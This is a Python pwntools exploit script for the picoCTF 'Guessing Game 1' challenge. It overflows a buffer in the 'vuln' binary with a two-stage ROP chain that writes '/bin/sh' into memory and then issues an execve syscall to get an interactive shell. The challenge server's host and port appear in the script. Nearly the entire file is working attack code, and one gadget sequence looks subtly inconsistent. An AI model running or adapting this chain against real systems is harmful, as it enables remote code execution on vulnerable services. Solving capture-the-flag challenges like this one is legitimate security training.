#!/bin/python3

from pwn import *

# https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9

context.log_level = "debug"

HOST = 'jupiter.challenges.picoctf.org'
PORT = 51462
EXE  = './vuln'

# r = remote(HOST, PORT)
#r = process("./vuln")
r = gdb.debug('./vuln', f'''
# break at main
b main
b win
# debug automatically breaks at _start - ignore it
continue
''')

elf = ELF(EXE)

main    = 0x401988 
pop_rax = 0x452267
pop_rdi = 0x401ac4
pop_rsi = 0x40a01e
pop_rdx = 0x48642b
syscall = 0x402204
bss     = 0x4c6500
ret     = 0x40101a 

read = elf.symbols['read']

random_sequence = [84, 87, 78, 16, 94]

r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(random_sequence[0]).encode())
r.recvuntil(b'Name? ')

print("Reading /bin/sh")

epxloit = b"" 
epxloit += p64(pop_rdi)
epxloit += p64(0)
epxloit += p64(pop_rsi)
epxloit += p64(bss)
epxloit += p64(pop_rdx)
epxloit += p64(42)
epxloit += p64(9)
epxloit += p64(read)
epxloit += p64(ret)
epxloit += p64(main)

r.sendline(b'\x90'*120 + epxloit)

r.sendline(b'/bin/sh\x00')


r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(random_sequence[1]).encode())
r.recvuntil(b'Name? ')

print("Sending exploit")

epxloit  = b'\x90'*120
epxloit += p64(pop_rax)
epxloit += p64(0x3b)
epxloit += p64(pop_rdi)
epxloit += p64(bss)
epxloit += p64(pop_rsi)
epxloit += p64(0)
epxloit += p64(pop_rdx)
epxloit += p64(0)
epxloit += p64(ret)
epxloit += p64(syscall)

r.sendline(epxloit)
r.interactive()